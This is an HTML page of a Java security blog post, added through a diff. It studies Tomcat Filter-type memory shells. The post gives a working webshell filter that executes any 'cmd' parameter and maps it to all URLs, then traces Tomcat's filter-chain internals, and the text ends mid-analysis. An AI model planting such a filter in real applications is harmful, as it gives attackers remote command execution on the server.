@@ -1,0 +1,447 @@
+<!DOCTYPE html>
+<html itemscope itemtype="http://schema.org/WebPage" lang="en">
+  <head>
+    
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+    <meta name="robots" content="noodp" />
+    <title>Java内存马-Filter - 东隅 Blog</title><meta name="author" content="东隅">
+<meta name="author-link" content="">
+<meta name="description" content="" /><meta name="keywords" content='代码审计, java安全' />
+  <meta itemprop="name" content="java内存马-Filter">
+  <meta itemprop="datePublished" content="2025-05-03T23:05:01+08:00">
+  <meta itemprop="dateModified" content="2025-05-03T23:05:01+08:00">
+  <meta itemprop="wordCount" content="491">
+  <meta itemprop="keywords" content="代码审计,Java安全"><meta property="og:url" content="https://dongyu29.github.io/posts/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/java%E5%AE%89%E5%85%A8/%E6%9C%A8%E9%A9%AC/java%E5%86%85%E5%AD%98%E9%A9%AC-filter/">
+  <meta property="og:site_name" content="东隅 Blog">
+  <meta property="og:title" content="java内存马-Filter">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2025-05-03T23:05:01+08:00">
+    <meta property="article:modified_time" content="2025-05-03T23:05:01+08:00">
+    <meta property="article:tag" content="代码审计">
+    <meta property="article:tag" content="Java安全">
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="java内存马-Filter">
+<meta name="application-name" content="FixIt">
+<meta name="apple-mobile-web-app-title" content="FixIt"><meta name="theme-color" data-light="#f8f8f8" data-dark="#252627" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="icon" href="https://raw.githubusercontent.com/dongyu29/dongyu29.github.io/main/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" href="https://dongyu29.github.io/posts/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/java%E5%AE%89%E5%85%A8/%E6%9C%A8%E9%A9%AC/java%E5%86%85%E5%AD%98%E9%A9%AC-filter/" /><link rel="prev" href="https://dongyu29.github.io/posts/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/java%E5%AE%89%E5%85%A8/%E6%9C%A8%E9%A9%AC/java%E5%86%85%E5%AD%98%E9%A9%AC-servlet/" /><link rel="next" href="https://dongyu29.github.io/about/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
+    <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
+    <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
+  {
+    "@context": "http://schema.org",
+    "@type": "BlogPosting",
+    "headline": "java内存马-Filter",
+    "inLanguage": "en",
+    "mainEntityOfPage": {
+      "@type": "WebPage",
+      "@id": "https:\/\/dongyu29.github.io\/posts\/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6\/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1\/java%E5%AE%89%E5%85%A8\/%E6%9C%A8%E9%A9%AC\/java%E5%86%85%E5%AD%98%E9%A9%AC-filter\/"
+    },"image": ["https:\/\/raw.githubusercontent.com\/dongyu29\/dongyu29.github.io\/main\/favicon.ico"],"genre": "posts","keywords": "代码审计, java安全","wordcount":  491 ,
+    "url": "https:\/\/dongyu29.github.io\/posts\/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6\/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1\/java%E5%AE%89%E5%85%A8\/%E6%9C%A8%E9%A9%AC\/java%E5%86%85%E5%AD%98%E9%A9%AC-filter\/","datePublished": "2025-05-03T23:05:01+08:00","dateModified": "2025-05-03T23:05:01+08:00","publisher": {
+      "@type": "Organization",
+      "name": "","logo": "https:\/\/raw.githubusercontent.com\/dongyu29\/dongyu29.github.io\/main\/favicon.ico"},"author": {
+        "@type": "Person",
+        "name": "东隅"
+      },"description": ""
+  }
+  </script></head>
+  <body data-header-desktop="sticky" data-header-mobile="auto"><script>(window.localStorage?.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('light' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'light' === 'dark')) && document.body.setAttribute('data-theme', 'dark');</script><div class="wrapper" data-page-style="normal"><header class="desktop animate__faster" id="header-desktop">
+  <div class="header-wrapper">
+    <div class="header-title">
+      <a href="/" title="东隅 Blog"><img loading="lazy" src="https://raw.githubusercontent.com/dongyu29/dongyu29.github.io/main/favicon.ico" alt="东隅 Blog" data-title="东隅 Blog" width="26" height="26" class="logo" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/><span class="header-title-pre"> </span><span class="typeit"><template> 东隅 Blog</template></span></a><span class="header-subtitle"></span></div>
+    <nav>
+      <ul class="menu"><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/posts/"
+                
+                
+              ><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden="true"></i> Posts</a></li><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/categories/"
+                
+                
+              ><i class="fa-solid fa-th fa-fw fa-sm" aria-hidden="true"></i> Categories</a></li><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/tags/"
+                
+                
+              ><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> Tags</a></li><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/about/"
+                
+                
+              ><i class="fa-regular fa-id-card fa-fw fa-sm fa-fw fa-sm" aria-hidden="true"></i> About</a></li><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/about/"
+                
+                
+              ></a></li><li class="menu-item delimiter"></li><li class="menu-item theme-switch" title="Switch Theme">
+          <i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i>
+        </li></ul>
+    </nav>
+  </div>
+</header><header class="mobile animate__faster" id="header-mobile">
+  <div class="header-container">
+    <div class="header-wrapper">
+      <div class="header-title">
+        <a href="/" title="东隅 Blog"><img loading="lazy" src="https://raw.githubusercontent.com/dongyu29/dongyu29.github.io/main/favicon.ico" alt="东隅 Blog" data-title="东隅 Blog" width="26" height="26" class="logo" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/><span class="header-title-pre"> </span><span class="typeit"><template> 东隅 Blog</template></span></a><span class="header-subtitle"></span></div>
+      <div class="menu-toggle" id="menu-toggle-mobile">
+        <span></span><span></span><span></span>
+      </div>
+    </div>
+    <nav>
+      <ul class="menu" id="menu-mobile"><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/posts/"
+                  
+                  
+                ><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden="true"></i> Posts</a></li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/categories/"
+                  
+                  
+                ><i class="fa-solid fa-th fa-fw fa-sm" aria-hidden="true"></i> Categories</a></li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/tags/"
+                  
+                  
+                ><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> Tags</a></li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/about/"
+                  
+                  
+                ><i class="fa-regular fa-id-card fa-fw fa-sm fa-fw fa-sm" aria-hidden="true"></i> About</a></li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/about/"
+                  
+                  
+                ></a></li><li class="menu-item menu-system">
+          <span class="menu-system-item theme-switch" title="Switch Theme"><i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i></span></li>
+      </ul>
+    </nav>
+  </div>
+</header><nav aria-label="breadcrumb" class="breadcrumb-container sticky">
+    <ol class="breadcrumb"><li class="breadcrumb-item"><a href="/" title="东隅 Blog">Home</a></li><li class="breadcrumb-item"><a href="/posts/" title="Posts">Posts</a></li><li class="breadcrumb-item active" aria-current="page">Java内存马-Filter</li>
+    </ol>
+  </nav><main class="container"><aside class="aside-collection animate__animated animate__fadeIn animate__faster" aria-label="Collections"></aside>
+
+  <article class="page single">
+    <div class="header"><h1 class="single-title animate__animated animate__flipInX"><span title="Repost" class="icon-repost"><i class="fa-solid x" aria-hidden="true"></i></span><span>Java内存马-Filter</span>
+      </h1></div><div class="post-meta">
+      <div class="post-meta-line"><span class="post-author"><span class="author"><img loading="lazy" src="https://raw.githubusercontent.com/dongyu29/dongyu29.github.io/main/favicon.ico" alt="东隅" data-title="东隅" width="20" height="20" class="avatar" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/>&nbsp;东隅</span></span><span class="post-included-in">&nbsp;included in <a href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" class="post-category" title="Category - 代码审计"><i class="fa-regular fa-folder fa-fw" aria-hidden="true"></i> 代码审计</a></span></div><div class="post-meta-line"><span title="published on 2025-05-03 23:05:01"><i class="fa-solid fa-calendar-days fa-fw me-1" aria-hidden="true"></i><time datetime="2025-05-03">2025-05-03</time></span>&nbsp;<span title="491 words"><i class="fa-solid fa-pencil-alt fa-fw me-1" aria-hidden="true"></i>About 500 words</span>&nbsp;<span><i class="fa-regular fa-clock fa-fw me-1" aria-hidden="true"></i>3 minutes</span>&nbsp;</div>
+    </div><div class="details toc" id="toc-static" data-kept="false">
+        <div class="details-summary toc-title">
+          <span>Contents</span>
+          <span><i class="details-icon fa-solid fa-angle-right" aria-hidden="true"></i></span>
+        </div>
+        <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#准备">准备</a></li>
+    <li><a href="#debug">debug</a></li>
+    <li><a href="#编写脚本">编写脚本</a></li>
+  </ul>
+</nav></div>
+      </div><div class="content" id="content" data-end-flag="-----（完）-----"><h2 id="准备" class="heading-element"><span>准备</span>
+  <a href="#%e5%87%86%e5%a4%87" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p>先写一个恶意filter示范</p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#ff636f">import</span> <span style="color:#58a1dd">javax.servlet.*</span>;
+</span></span><span style="display:flex;"><span><span style="color:#ff636f">import</span> <span style="color:#58a1dd">java.io.IOException</span>;
+</span></span><span style="display:flex;"><span><span style="color:#ff636f">import</span> <span style="color:#58a1dd">java.io.InputStream</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff636f">public</span> <span style="color:#ff636f">class</span> <span style="color:#58a1dd">filtermem</span> <span style="color:#ff636f">implements</span> <span style="color:#58a1dd">Filter</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#ff636f">public</span> <span style="color:#ff636f">void</span> <span style="color:#58a1dd">doFilter</span>(<span style="color:#58a1dd">ServletRequest</span> <span style="color:#58a1dd">request</span>, <span style="color:#58a1dd">ServletResponse</span> <span style="color:#58a1dd">response</span>, <span style="color:#58a1dd">FilterChain</span> <span style="color:#58a1dd">chain</span>)
+</span></span><span style="display:flex;"><span>            <span style="color:#ff636f">throws</span> <span style="color:#58a1dd">IOException</span>, <span style="color:#58a1dd">ServletException</span> {
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">String</span> <span style="color:#58a1dd">cmd</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">request</span>.<span style="color:#58a1dd">getParameter</span>(<span style="color:#a6be9d">&#34;cmd&#34;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#ff636f">if</span> (<span style="color:#58a1dd">cmd</span> <span style="color:#ff636f">!=</span> <span style="color:#ff636f">null</span> <span style="color:#ff636f">&amp;&amp;</span> <span style="color:#ff636f">!</span><span style="color:#58a1dd">cmd</span>.<span style="color:#58a1dd">isEmpty</span>()) {
+</span></span><span style="display:flex;"><span>            <span style="color:#58a1dd">Process</span> <span style="color:#58a1dd">process</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">Runtime</span>.<span style="color:#58a1dd">getRuntime</span>().<span style="color:#58a1dd">exec</span>(<span style="color:#58a1dd">cmd</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            <span style="color:#828b96;font-style:italic">// 获取命令输出（示例：输出到响应）</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#58a1dd">InputStream</span> <span style="color:#58a1dd">inputStream</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">process</span>.<span style="color:#58a1dd">getInputStream</span>();
+</span></span><span style="display:flex;"><span>            <span style="color:#ff636f">int</span> <span style="color:#58a1dd">c</span>;
+</span></span><span style="display:flex;"><span>            <span style="color:#ff636f">while</span> ((<span style="color:#58a1dd">c</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">inputStream</span>.<span style="color:#58a1dd">read</span>()) <span style="color:#ff636f">!=</span> <span style="color:#ff636f">-</span><span style="color:#58a1dd">1</span>) {
+</span></span><span style="display:flex;"><span>                <span style="color:#58a1dd">response</span>.<span style="color:#58a1dd">getWriter</span>().<span style="color:#58a1dd">write</span>(<span style="color:#58a1dd">c</span>);
+</span></span><span style="display:flex;"><span>            }
+</span></span><span style="display:flex;"><span>            <span style="color:#58a1dd">inputStream</span>.<span style="color:#58a1dd">close</span>();
+</span></span><span style="display:flex;"><span>            <span style="color:#ff636f">return</span>; <span style="color:#828b96;font-style:italic">// 终止链条传递</span>
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#828b96;font-style:italic">// 继续处理请求</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">chain</span>.<span style="color:#58a1dd">doFilter</span>(<span style="color:#58a1dd">request</span>, <span style="color:#58a1dd">response</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff636f">public</span> <span style="color:#ff636f">void</span> <span style="color:#58a1dd">init</span>(<span style="color:#58a1dd">FilterConfig</span> <span style="color:#58a1dd">filterConfig</span>) <span style="color:#ff636f">throws</span> <span style="color:#58a1dd">ServletException</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#828b96;font-style:italic">// 初始化操作（可留空）</span>
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#ff636f">public</span> <span style="color:#ff636f">void</span> <span style="color:#58a1dd">destroy</span>() {
+</span></span><span style="display:flex;"><span>        <span style="color:#828b96;font-style:italic">// 资源销毁（可留空）</span>
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>}</span></span></code></pre></div><p>web.xml配置</p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span>    <span style="color:#828b96;font-style:italic">&lt;!-- 配置 Filter --&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#58a1dd">&lt;filter&gt;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">&lt;filter-name&gt;</span>filtermem<span style="color:#58a1dd">&lt;/filter-name&gt;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">&lt;filter-class&gt;</span>memshell.filtermem<span style="color:#58a1dd">&lt;/filter-class&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#58a1dd">&lt;/filter&gt;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#828b96;font-style:italic">&lt;!-- 配置 Filter 的映射 --&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#58a1dd">&lt;filter-mapping&gt;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">&lt;filter-name&gt;</span>filtermem<span style="color:#58a1dd">&lt;/filter-name&gt;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">&lt;url-pattern&gt;</span>/*<span style="color:#58a1dd">&lt;/url-pattern&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#58a1dd">&lt;/filter-mapping&gt;</span></span></span></code></pre></div><p>启动tomcat，就可以在任意位置路由输入cmd执行命令了</p>
+<h2 id="debug" class="heading-element"><span>debug</span>
+  <a href="#debug" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p>调用链</p>
+<p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com//img202505032140262.png" alt="image-20250503214057211" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com//img202505032140262.png?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com//img202505032140262.png?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com//img202505032140262.png?size=large 2x" data-title="image-20250503214057211" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>往上跟一步，这里调用的filter是从filterConfig来的，filterConfig又是从上面的filters数组来的</p>
+<p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com//img202505032142918.png" alt="image-20250503214216873" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com//img202505032142918.png?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com//img202505032142918.png?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com//img202505032142918.png?size=large 2x" data-title="image-20250503214216873" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>跟这个filters数组可以跟到这个方法</p>
+<p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com//img202505032145055.png" alt="image-20250503214534011" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com//img202505032145055.png?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com//img202505032145055.png?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com//img202505032145055.png?size=large 2x" data-title="image-20250503214534011" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>这个方法是createFilterChain调用的：<code>public static ApplicationFilterChain createFilterChain(ServletRequest request, Wrapper wrapper, Servlet servlet)</code></p>
+<p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com//img202505032235334.png" alt="image-20250503223526289" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com//img202505032235334.png?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com//img202505032235334.png?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com//img202505032235334.png?size=large 2x" data-title="image-20250503223526289" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>注意上面的filterConfig不能为空，此处context的filterConfigs是一个hashmap</p>
+<p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com//img202505032239768.png" alt="image-20250503223928729" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com//img202505032239768.png?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com//img202505032239768.png?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com//img202505032239768.png?size=large 2x" data-title="image-20250503223928729" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>也就是说此处是在filterMaps里面找filter的名字再去context的filterConfigs做匹配</p>
+<p>往上找这个filterMaps哪来的，如下：</p>
+<p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com//img202505032151901.png" alt="image-20250503215113874" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com//img202505032151901.png?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com//img202505032151901.png?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com//img202505032151901.png?size=large 2x" data-title="image-20250503215113874" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>直接去跟context.findFilterMaps</p>
+<p>返回filterMaps字段</p>
+<p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com//img202505032209700.png" alt="image-20250503220944671" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com//img202505032209700.png?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com//img202505032209700.png?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com//img202505032209700.png?size=large 2x" data-title="image-20250503220944671" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>跟进，有一处filterMaps.add(filterMap);调用</p>
+<p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com//img202505032210658.png" alt="image-20250503221017617" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com//img202505032210658.png?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com//img202505032210658.png?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com//img202505032210658.png?size=large 2x" data-title="image-20250503221017617" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>跟进去看看</p>
+<p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com//img202505032210759.png" alt="image-20250503221057731" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com//img202505032210759.png?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com//img202505032210759.png?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com//img202505032210759.png?size=large 2x" data-title="image-20250503221057731" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>这里contextConfig是老朋友了</p>
+<p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com//img202505032211388.png" alt="image-20250503221108347" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com//img202505032211388.png?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com//img202505032211388.png?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com//img202505032211388.png?size=large 2x" data-title="image-20250503221108347" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>跟进去又是private void configureContext(WebXml webxml)方法</p>
+<p>这里有两处关键点，也就是filterMap初始化的地方</p>
+<p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com//img202505032214489.png" alt="image-20250503221403457" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com//img202505032214489.png?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com//img202505032214489.png?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com//img202505032214489.png?size=large 2x" data-title="image-20250503221403457" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>那么这里filterMap有了，还记得上面说过<code>此处是在filterMaps里面找filter的名字再去context的filterConfigs做匹配</code></p>
+<p>filterconfig貌似还没有被赋值，去找找</p>
+<p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com//img202505032254167.png" alt="image-20250503225447129" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com//img202505032254167.png?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com//img202505032254167.png?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com//img202505032254167.png?size=large 2x" data-title="image-20250503225447129" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>找到一个filterStart方法，拿着filterDef去做遍历给filterConfig赋值</p>
